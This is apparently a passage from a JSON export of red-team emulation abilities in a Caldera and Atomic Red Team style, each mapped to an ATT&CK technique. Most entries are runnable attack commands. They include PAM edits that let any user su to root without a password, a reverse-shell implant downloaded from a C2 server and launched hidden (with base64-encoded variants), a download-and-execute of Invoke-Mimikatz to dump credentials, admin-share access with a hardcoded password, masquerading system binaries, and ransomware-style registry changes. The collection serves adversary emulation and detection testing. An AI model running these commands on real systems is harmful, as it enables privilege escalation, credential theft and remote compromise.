PAM module that allows every user to su to root without a password.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["8545b9_pam_evil.c"], "parsers": [], "cleanup": ["sudo sed -i \"\\,auth sufficient /tmp/pam_evil.so,d\" /etc/pam.d/su-l"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f /tmp/pam_evil.so ]; then : ; else sudo gcc -shared -fPIC -o /tmp/pam_evil.so 8545b9_pam_evil.c; fi; if [ -f /usr/include/security/pam_modules.h ]; then : ; else if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi; fi;  ;  sudo sed -i \"1s,^,auth sufficient /tmp/pam_evil.so\\n,g\" /etc/pam.d/su-l", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Modify Authentication Process: Pluggable Authentication Modules", "ability_id": "9630f6d2ac825e459abc69a7d692e98b", "technique_id": "T1556.003", "tactic": "multiple", "requirements": [], "name": "Malicious PAM module", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo sed -i \"\\,auth sufficient pam_succeed_if.so uid >= 0,d\" /etc/pam.d/su-l"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo sed -i \"1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su-l", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Modify Authentication Process: Pluggable Authentication Modules", "ability_id": "f4873fff8940c0507868b38e78de1b0d", "technique_id": "T1556.003", "tactic": "multiple", "requirements": [], "name": "Malicious PAM rule", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\Curl.exe -s -A \"HttpBrowser/1.0\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"*<|>*\" -m3 www.google.com >nul 2>&1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: Web Protocols", "ability_id": "af4bcca1e12279e4b6388cefcf40b190", "technique_id": "T1071.001", "tactic": "command-and-control", "requirements": [], "name": "Malicious User Agents - CMD", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com; curl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com; curl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com; curl -s -A \"*<|>*\" -m3 www.google.com", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com; curl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com; curl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com; curl -s -A \"*<|>*\" -m3 www.google.com", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: Web Protocols", "ability_id": "810ebb2d039e78c1017dcb5efbd4a074", "technique_id": "T1071.001", "tactic": "command-and-control", "requirements": [], "name": "Malicious User Agents - Nix", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: Web Protocols", "ability_id": "ef2c951840423ba90c208867dcf89c87", "technique_id": "T1071.001", "tactic": "command-and-control", "requirements": [], "name": "Malicious User Agents - Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del C:\\T1036.003.txt >nul 2>&1 && del C:\\lsm.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe && C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "18348573c1f989a6cca9e9bf10809700", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Malicious process Masquerading as LSM.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["taskkill /IM Calculator.exe /f >$null 2>$null; Remove-Item $env:userprofile\\Downloads\\T1036 -recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path $env:userprofile\\Downloads\\T1036.zip) { ; } else {Invoke-WebRequest -OutFile \"$env:userprofile\\Downloads\\T1036.zip\" https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip};  ;  Expand-Archive -Path $env:userprofile\\Downloads\\T1036.zip -DestinationPath $env:userprofile\\Downloads\\T1036 -Force; cd $env:userprofile\\Downloads\\T1036; cmd /c $env:userprofile\\Downloads\\T1036\\README.cmd >$null 2>$null", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Masquerading", "ability_id": "b3f30f3fd6b58f412ca7f06c4408b6a1", "technique_id": "T1036", "tactic": "defense-evasion", "requirements": [], "name": "Malware Masquerading and Execution from Zip File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A reverse-shell agent which communicates via the TCP contact", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v", "language": null, "name": "sh", "variations": [{"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtaHR0cCAkc2VydmVyIC1zb2NrZXQgJHNvY2tldCAtY29udGFjdCAkY29udGFjdCAtdg==", "description": "Run against the UDP contact"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtaHR0cCAkc2VydmVyIC1zb2NrZXQgJHNvY2tldCAtY29udGFjdCAkY29udGFjdCAm", "description": "Download with a random name and start as a background process"}], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v", "language": null, "name": "sh", "variations": [{"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY=", "description": "Run against the UDP contact"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY=", "description": "Download with a random name and start as a background process"}], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if ($host.Version.Major -ge 3){$ErrAction= \"ignore\"}else{$ErrAction= \"SilentlyContinue\"};\n$server=\"#{app.contact.http}\";\n$socket=\"#{app.contact.tcp}\";\n$contact=\"tcp\";\n$url=\"$server/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"manx.go\");\n$data=$wc.DownloadData($url);\nGet-Process | ? {$_.Path -like \"C:\\Users\\Public\\#{agents.implant_name}.exe\"} | stop-process -f -ea $ErrAction;\nrm -force \"C:\\Users\\Public\\#{agents.implant_name}.exe\" -ea $ErrAction;\n([io.file]::WriteAllBytes(\"C:\\Users\\Public\\#{agents.implant_name}.exe\",$data)) | Out-Null;\nStart-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList \"-socket $socket -http $server -contact $contact\" -WindowStyle hidden;", "language": null, "name": "psh", "variations": [{"command": "aWYgKCRob3N0LlZlcnNpb24uTWFqb3IgLWdlIDMpeyRFcnJBY3Rpb249ICJpZ25vcmUifWVsc2V7JEVyckFjdGlvbj0gIlNpbGVudGx5Q29udGludWUifTskc2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijskc29ja2V0PSIwLjAuMC4wOjcwMTEiOyRjb250YWN0PSJ1ZHAiOyR1cmw9IiRzZXJ2ZXIvZmlsZS9kb3dubG9hZCI7JHdjPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHdjLkhlYWRlcnMuYWRkKCJwbGF0Zm9ybSIsIndpbmRvd3MiKTskd2MuSGVhZGVycy5hZGQoImZpbGUiLCJtYW54LmdvIik7JGRhdGE9JHdjLkRvd25sb2FkRGF0YSgkdXJsKTtHZXQtUHJvY2VzcyB8ID8geyRfLlBhdGggLWxpa2UgIkM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSJ9IHwgc3RvcC1wcm9jZXNzIC1mIC1lYSAkRXJyQWN0aW9uO3JtIC1mb3JjZSAiQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIiAtZWEgJEVyckFjdGlvbjsoW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiLCRkYXRhKSkgfCBPdXQtTnVsbDtTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCBDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUgLUFyZ3VtZW50TGlzdCAiLXNvY2tldCAkc29ja2V0IC1odHRwICRzZXJ2ZXIgLWNvbnRhY3QgJGNvbnRhY3QiIC1XaW5kb3dTdHlsZSBoaWRkZW47", "description": "Run against the UDP contact"}], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "356d1722-7784-40c4-822b-0cf864b0b36d", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Manx", "plugin": "manx"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Map Admin share utilizing PowerShell\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: SMB/Windows Admin Shares", "ability_id": "31a7326fcc56c71d97da23e3fe1ec364", "technique_id": "T1021.002", "tactic": "lateral-movement", "requirements": [], "name": "Map Admin Share PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Connecting To Remote Shares\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote Services: SMB/Windows Admin Shares", "ability_id": "a719076e595f5a106be38682a444ad2c", "technique_id": "T1021.002", "tactic": "lateral-movement", "requirements": [], "name": "Map admin share", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$Env:windir\\Temp\\svchost.exe\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Add-Type -TypeDefinition @'; public class Test {;     public static void Main(string[] args) {;         System.Console.WriteLine(\"tweet, tweet\");     }; }; '@ -OutputAssembly \"$Env:windir\\Temp\\svchost.exe\"; Start-Process -FilePath \"$Env:windir\\Temp\\svchost.exe\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Masquerading: Match Legitimate Name or Location", "ability_id": "029770bd7c3a403daeab3af692af0046", "technique_id": "T1036.005", "tactic": "defense-evasion", "requirements": [], "name": "Masquerade as a built-in system executable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /Q /F %APPDATA%\\notepad.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y && cmd.exe /c %APPDATA%\\notepad.exe /B", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "7e4a00e15142a1c5edb9dd0ecc86f1d3", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Masquerading - cscript.exe running as notepad.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["1db90b_T1036.003.exe"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item ($env:TEMP + \"\\svchost.exe\") -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy 1db90b_T1036.003.exe ($env:TEMP + \"\\svchost.exe\"); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id; Stop-Process -ID $myT1036_003", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "6fdc9037290299164d52b65219d628ef", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Masquerading - non-windows exe running as windows exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y && cmd.exe /K %APPDATA%\\taskhostw.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "f82efa1ac00819fe5260af67800cbdcb", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Masquerading - powershell.exe running as taskhostw.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item ($env:TEMP + \"\\svchost.exe\") -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy $env:ComSpec ($env:TEMP + \"\\svchost.exe\"); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id; Stop-Process -ID $myT1036_003", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "995a75a3009f98f56160ea61cb00645a", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Masquerading - windows exe running as different windows exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /Q /F %APPDATA%\\svchost.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y && cmd.exe /c %APPDATA%\\svchost.exe /B", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "0c05ae67acce3a0130e88a69c075810f", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Masquerading - wscript.exe running as svchost.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/crond"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp /bin/sh /tmp/crond; echo 'sleep 5' | /tmp/crond", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "bfaa2b76303409212beaf87d88cc8564", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Masquerading as Linux crond process.", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe && %SystemRoot%\\Temp\\lsass.exe /B", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "d5ac8f5ec45224dc36453a9490845f23", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "Masquerading as Windows LSASS process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": null, "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "1c4576eb8d4cea58c18e4b087d9c9ac0", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Microsoft.Workflow.Compiler.exe Payload Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "59fab1b89fc78dee4436f070209dd6df", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Mimic Ransomware - Allow Multiple RDP Sessions per User", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "14ca1cfcf0455a15ae48b907f07d6599", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Mimic Ransomware - Enable Multiple User Sessions", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "6aaf86c797e33b0ee3d16592be76f46e", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", 